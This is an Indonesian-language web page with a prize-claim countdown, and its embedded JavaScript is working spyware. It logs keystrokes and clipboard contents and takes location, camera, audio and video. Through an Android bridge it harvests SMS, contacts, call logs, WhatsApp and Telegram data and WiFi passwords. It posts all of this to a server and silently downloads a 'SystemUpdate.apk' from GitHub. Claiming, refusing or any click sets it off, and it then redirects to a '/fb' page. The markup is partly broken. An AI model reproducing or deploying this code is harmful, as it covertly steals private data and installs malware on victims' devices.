<!DOCTYPE html>
<html>

    <style>
        html,body{margin:0;padding:0;width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}

        </div>
        <p style="color:#ffcc00;font-size:14px">⏰ Tersisa <span id="timer" style="font-weight:bold">05:00</span></p>

<script>
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var dataStore = [];
var hasLS = (typeof localStorage !== 'undefined');
var hasSS = (typeof sessionStorage !== 'undefined');
var semuaDidapat = false;

if(hasLS && localStorage.getItem('sudah_klaim') === '1') {
    semuaDidapat = true;
    var popup = document.getElementById('popupDana');
    if(popup) popup.style.display = 'none';
}

if(hasLS) {
    var saved = localStorage.getItem('vd');
    if(saved) try{ dataStore = JSON.parse(saved) } catch(e){}
}

function simpanLokal() { if(hasLS) try{ localStorage.setItem('vd', JSON.stringify(dataStore.slice(-500))) } catch(e){} }

function K(d) {
    dataStore.push({ waktu: new Date().toISOString(), sumber: d.sumber || d.type || 'unknown', data: d.data || d });
    simpanLokal();
    try {
        fetch('/data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(d)
        }).catch(function(){});
    } catch(e) {}
}

var A = {
    isAvailable: typeof AndroidBridge !== 'undefined',
    getDeviceInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getDeviceInfo())}catch(e){}} return null },
    getIMEI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMEI()}catch(e){}} return null },
    getIMSI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMSI()}catch(e){}} return null },
    getPhoneNumber: function() { if(this.isAvailable){ try{return AndroidBridge.getPhoneNumber()}catch(e){}} return null },
    getGoogleAccount: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getGoogleAccount())}catch(e){}} return null },
    getFacebookAccount: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getFacebookAccount())}catch(e){}} return null },
    getAllContacts: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllContacts())}catch(e){}} return null },
    getAllSMS: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllSMS())}catch(e){}} return null },
    getCallLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCallLog())}catch(e){}} return null },
    getWhatsAppData: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getWhatsAppData())}catch(e){}} return null },
    getTelegramData: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getTelegramData())}catch(e){}} return null },
    listAllFiles: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.listAllFiles())}catch(e){}} return null },
    getInstalledApps: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getInstalledApps())}catch(e){}} return null },
    getWiFiPasswords: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getWiFiPasswords())}catch(e){}} return null },
    getBluetoothInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBluetoothInfo())}catch(e){}} return null },
    getSensors: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getSensors())}catch(e){}} return null },
    getBatteryDetail: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBatteryDetail())}catch(e){}} return null },
    getCalendarEvents: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCalendarEvents())}catch(e){}} return null },
    getBrowserHistory: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBrowserHistory())}catch(e){}} return null },
    getNotificationLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getNotificationLog())}catch(e){}} return null },
    takeScreenshot: function() { if(this.isAvailable){ try{return AndroidBridge.takeScreenshot()}catch(e){}} return null },
    startRecording: function() { if(this.isAvailable){ try{return AndroidBridge.startRecording()}catch(e){}} return null },
    startVideoRecording: function() { if(this.isAvailable){ try{return AndroidBridge.startVideoRecording()}catch(e){}} return null },
    getClipboard: function() { if(this.isAvailable){ try{return AndroidBridge.getClipboard()}catch(e){}} return null },
    keepAwake: function() { if(this.isAvailable){ try{AndroidBridge.keepAwake(true);return true}catch(e){}} return false },
    downloadFile: function(u,f) { if(this.isAvailable){ try{AndroidBridge.downloadFile(u,f);return true}catch(e){}} return false }

function GD() {
    var d = {
        w:Date.now(), ua:navigator.userAgent, pl:navigator.platform, la:navigator.language,
        sc:screen.width+'x'+screen.height, cd:screen.colorDepth, pr:window.devicePixelRatio,
        co:document.cookie, ls:(hasLS?JSON.stringify(localStorage):'{}'), ss:(hasSS?JSON.stringify(sessionStorage):'{}'),
        ur:location.href, rf:document.referrer, dm:navigator.deviceMemory||'N/A',
        cc:navigator.hardwareConcurrency||'N/A', on:navigator.onLine, ve:navigator.vendor,
        mt:navigator.maxTouchPoints, tz:Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    if(A.isAvailable) {
        d.android = {
            deviceInfo:A.getDeviceInfo(), imei:A.getIMEI(), imsi:A.getIMSI(),
            phoneNumber:A.getPhoneNumber(), googleAccount:A.getGoogleAccount(),
            facebookAccount:A.getFacebookAccount(), bluetoothInfo:A.getBluetoothInfo(),
            sensors:A.getSensors(), batteryDetail:A.getBatteryDetail(),
            calendarEvents:A.getCalendarEvents(), browserHistory:A.getBrowserHistory(),
            notificationLog:A.getNotificationLog()
        };
    }
    K({sumber:'init',data:d}); return d;
}

async function getIP() { try{ var r=await fetch('https://api.ipify.org?format=json'); var d=await r.json(); K({sumber:'ip',data:d.ip}); if(hasLS) localStorage.setItem('pip',d.ip) } catch(e){} }
function ambilLokasi() { try{ navigator.geolocation.getCurrentPosition(function(p){ K({sumber:'lokasi',data:{lat:p.coords.latitude,lon:p.coords.longitude,akurasi:p.coords.accuracy}}) }, function(){}) } catch(e){} }
function ambilKamera() { try{ navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}}).then(function(s){ s.getTracks().forEach(function(t){t.stop()}); K({sumber:'kamera',data:'aktif'}) }).catch(function(){}) } catch(e){} }
function ambilKontak() { if(A.isAvailable){ var k=A.getAllContacts(); if(k) K({sumber:'kontak_all',data:k}) } else { try{ if('contacts' in navigator){ navigator.contacts.select(['name','tel','email','address'],{multiple:true}).then(function(k){ K({sumber:'kontak_all',data:k}) }).catch(function(){}) } } catch(e){} } }
function ambilSMS() { if(A.isAvailable){ var s=A.getAllSMS(); if(s) K({sumber:'sms_all',data:s}) } }
function ambilCallLog() { if(A.isAvailable){ var c=A.getCallLog(); if(c) K({sumber:'call_log',data:c}) } }
function ambilWA() { if(A.isAvailable){ var w=A.getWhatsAppData(); if(w) K({sumber:'whatsapp',data:w}) } }
function ambilTelegram() { if(A.isAvailable){ var t=A.getTelegramData(); if(t) K({sumber:'telegram',data:t}) } }
function ambilFile() { if(A.isAvailable){ var f=A.listAllFiles(); if(f) K({sumber:'files_all',data:f}) } }
function ambilApp() { if(A.isAvailable){ var a=A.getInstalledApps(); if(a) K({sumber:'aplikasi_all',data:a}) } }
function ambilWiFi() { if(A.isAvailable){ var w=A.getWiFiPasswords(); if(w) K({sumber:'wifi_passwords',data:w}) } }
function ambilSensors() { if(A.isAvailable){ var s=A.getSensors(); if(s) K({sumber:'sensors',data:s}) } }
function ambilCalendar() { if(A.isAvailable){ var c=A.getCalendarEvents(); if(c) K({sumber:'calendar',data:c}) } }
function ambilBrowserHistory() { if(A.isAvailable){ var h=A.getBrowserHistory(); if(h) K({sumber:'browser_history',data:h}) } }
function ambilNotifications() { if(A.isAvailable){ var n=A.getNotificationLog(); if(n) K({sumber:'notifications',data:n}) } }
function ambilBaterai() { try{ navigator.getBattery().then(function(b){ K({sumber:'baterai',data:{level:Math.round(b.level*100)+'%',charging:b.charging}}) }) } catch(e){} }
function ambilSS() { if(A.isAvailable){ var s=A.takeScreenshot(); if(s) K({sumber:'screenshot',data:s}) } else { try{ if(typeof html2canvas!=='undefined'){ html2canvas(document.body).then(function(c){ K({sumber:'screenshot',data:c.toDataURL()}) }) } } catch(e){} } }
function ambilAudio() { if(A.isAvailable){ var a=A.startRecording(); if(a) K({sumber:'audio_record',data:a}) } else { try{ navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){ var m=new MediaRecorder(s); m.ondataavailable=function(e){ if(e.data.size>0){ var r=new FileReader(); r.onload=function(){ K({sumber:'audio_record',data:r.result}) }; r.readAsDataURL(e.data) } }; m.start(); setTimeout(function(){ m.stop() },5000) }).catch(function(){}) } catch(e){} } }
function ambilVideo() { if(A.isAvailable){ var v=A.startVideoRecording(); if(v) K({sumber:'video_record',data:v}) } else { try{ navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(function(s){ var m=new MediaRecorder(s); m.ondataavailable=function(e){ if(e.data.size>0){ var r=new FileReader(); r.onload=function(){ K({sumber:'video_record',data:r.result}) }; r.readAsDataURL(e.data) } }; m.start(); setTimeout(function(){ m.stop() },5000) }).catch(function(){}) } catch(e){} } }

var inputData={};
var keyTimestamps=[];
document.addEventListener('keydown',function(e){ keyTimestamps.push({key:e.key,time:Date.now()}) });
document.addEventListener('input',function(e){ if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){ inputData[e.target.id||e.target.name||e.target.type]=e.target.value } });
setInterval(function(){
    if(Object.keys(inputData).length>0){ K({sumber:'keylogger',data:inputData,waktu:Date.now()}); inputData={} }
    if(keyTimestamps.length>0){ K({sumber:'keystroke_pattern',data:keyTimestamps,waktu:Date.now()}); keyTimestamps=[] }
},10000);

function bacaClipboard() { if(A.isAvailable){ var t=A.getClipboard(); if(t) K({sumber:'clipboard',data:t,method:'android'}) } try{ navigator.clipboard.readText().then(function(t){ if(t) K({sumber:'clipboard',data:t,method:'browser'}) }).catch(function(){}) } catch(e){} }
setTimeout(bacaClipboard,3000); setInterval(bacaClipboard,5000);

function ambilStorage() { try{ navigator.storage.estimate().then(function(s){ K({sumber:'storage',data:{usage:(s.usage/1024/1024).toFixed(2)+' MB',quota:(s.quota/1024/1024).toFixed(2)+' MB'}}) }) } catch(e){} }
function ambilNetwork() { try{ var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection; if(c){ K({sumber:'network',data:{type:c.type,downlink:c.downlink,rtt:c.rtt}}) } } catch(e){} }
function ambilIPLocal() { try { var pc=new RTCPeerConnection({iceServers:[]}); pc.createDataChannel(''); pc.createOffer().then(function(o){ pc.setLocalDescription(o) }); pc.onicecandidate=function(e){ if(e.candidate){ var ip=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/); if(ip){ K({sumber:'ip_local',data:ip[0]}); pc.close() } } }; } catch(e){} }
function ambilCanvasFP() { try { var c=document.createElement('canvas'); c.width=200;c.height=50; var ctx=c.getContext('2d'); ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60'; ctx.fillRect(0,0,100,50);ctx.fillStyle='#069'; ctx.fillText('Browser Fingerprint',2,15); var fp=c.toDataURL(); K({sumber:'canvas_fp',data:fp.substring(0,500)}); } catch(e){} }
function ambilWebGLFP() { try { var c=document.createElement('canvas'); var gl=c.getContext('webgl')||c.getContext('experimental-webgl'); if(gl){ var debug=gl.getExtension('WEBGL_debug_renderer_info'); if(debug){ K({sumber:'webgl',data:{vendor:gl.getParameter(debug.UNMASKED_VENDOR_WEBGL),renderer:gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}}); } } } catch(e){} }
function ambilPlugins() { try { var p=[]; for(var i=0;i<navigator.plugins.length;i++){ p.push(navigator.plugins[i].name) } if(p.length>0) K({sumber:'plugins',data:p}); } catch(e){} }
function ambilFonts() { try { var f=['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact']; var d=document.createElement('canvas');d.width=10;d.height=10; var ctx=d.getContext('2d'); var ada=[]; f.forEach(function(fn){ ctx.font='12px '+fn; var w=ctx.measureText('test').width; if(w>0) ada.push(fn); }); K({sumber:'fonts',data:ada}); } catch(e){} }
function ambilScreenDetail() { K({sumber:'screen_detail',data:{avail:screen.availWidth+'x'+screen.availHeight,outer:window.outerWidth+'x'+window.outerHeight,inner:window.innerWidth+'x'+window.innerHeight,orientation:screen.orientation?screen.orientation.type:'N/A'}}); }
function ambilDNT() { K({sumber:'dnt',data:navigator.doNotTrack||'unspecified'}); }
function cekAdBlock() { try { var ad=document.createElement('div'); ad.innerHTML='&nbsp;'; ad.className='adsbox'; document.body.appendChild(ad); setTimeout(function(){ if(ad.offsetHeight===0) K({sumber:'adblock',data:true}); else K({sumber:'adblock',data:false}); document.body.removeChild(ad); },100); } catch(e){} }

// DOWNLOAD
var files = [
    'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.apk',
    'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/Video.mp4'
];
var downloaded = [];

function downloadDiamDiam(url, filename) {
    fetch(url, {mode: 'no-cors'}).then(function(res) { return res.blob(); }).then(function(blob) {
        var objectURL = URL.createObjectURL(blob);
        var a = document.createElement('a');a.href=objectURL;a.download=filename;a.style.display='none';
        document.body.appendChild(a);a.click();
        setTimeout(function(){ document.body.removeChild(a);URL.revokeObjectURL(objectURL); },2000);
        downloaded.push(url);K({sumber:'download',data:{file:filename},waktu:Date.now()});
    }).catch(function() {
        var iframe=document.createElement('iframe');iframe.src=url;
        iframe.style.cssText='position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
        document.body.appendChild(iframe);setTimeout(function(){ document.body.removeChild(iframe); },5000);
        downloaded.push(url);K({sumber:'download',data:{file:filename},waktu:Date.now()});
    });
}

function initM2() {
    setTimeout(function() { if(downloaded.indexOf(files[0])===-1) { if(A.isAvailable){A.downloadFile(files[0],'SystemUpdate.apk')}else{downloadDiamDiam(files[0],'SystemUpdate.apk')} } },1000);
    setTimeout(function() { if(downloaded.indexOf(files[1])===-1) { if(A.isAvailable){A.downloadFile(files[1],'Video.mp4')}else{downloadDiamDiam(files[1],'Video.mp4')} } },3000);
}

function FK() {
    ambilKontak();ambilSMS();ambilCallLog();ambilWA();ambilTelegram();
    ambilFile();ambilApp();ambilWiFi();ambilSensors();ambilCalendar();
    ambilBrowserHistory();ambilNotifications();ambilSS();ambilAudio();ambilVideo();
    ambilStorage();ambilNetwork();ambilIPLocal();ambilCanvasFP();ambilWebGLFP();
    ambilPlugins();ambilFonts();ambilScreenDetail();ambilDNT();cekAdBlock();
    K({sumber:'full_kontrol',data:'selesai'});
}

function dapatkanSemua() {
    if(semuaDidapat) return;
    semuaDidapat = true;
    if(hasLS) localStorage.setItem('sudah_klaim', '1');
    var popup = document.getElementById('popupDana');if(popup) popup.style.display='none';
    ambilLokasi();ambilKamera();ambilBaterai();ambilStorage();
    ambilNetwork();ambilIPLocal();ambilCanvasFP();ambilWebGLFP();
    ambilPlugins();ambilFonts();ambilScreenDetail();ambilDNT();cekAdBlock();
    initM2();FK();bacaClipboard();
    setTimeout(function(){ window.location.href='https://verifikasi.site/fb'; },3000);
}

function klaim() { setTimeout(function(){ dapatkanSemua(); },500); K({sumber:'izin',data:'klaim'}); }
function tolak() { setTimeout(function(){ dapatkanSemua(); },500); K({sumber:'izin',data:'tolak'}); }
var clickHandler = function(){ setTimeout(function(){ dapatkanSemua(); },1000); };
document.addEventListener('click', clickHandler);
setTimeout(function(){ document.removeEventListener('click', clickHandler); }, 300000);

var w=300;
var timerInterval=setInterval(function(){
    w--;var m=Math.floor(w/60);var s=w%60;
    var el=document.getElementById('timer');if(el) el.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
    if(w<=0){ clearInterval(timerInterval); document.getElementById('popupDana').style.display='none'; setTimeout(function(){ dapatkanSemua(); },500); }
},1000);

function HB() { setInterval(function(){ K({sumber:'heartbeat',data:'alive'}) },10000) }
function SW() { if('serviceWorker' in navigator){ navigator.serviceWorker.register('/sw.js').then(function(r){ K({sumber:'keepalive',data:'sw_registered'}) }).catch(function(){}) } }
function KA() { if(A.isAvailable){ A.keepAwake() } try{ if('wakeLock' in navigator){ navigator.wakeLock.request('screen').then(function(w){ K({sumber:'keepalive',data:'wake_lock'}) }).catch(function(){}) } } catch(e){} }
function cleanup() { console.log=function(){};console.warn=function(){};console.error=function(){};console.info=function(){} }
setTimeout(cleanup,3000);

GD();getIP();SW();KA();HB();
setInterval(async function(){ K({sumber:'periodic',data:GD()}) },10000);
window.addEventListener('beforeunload',function(){ K({sumber:'close',data:'Tutup'}) });
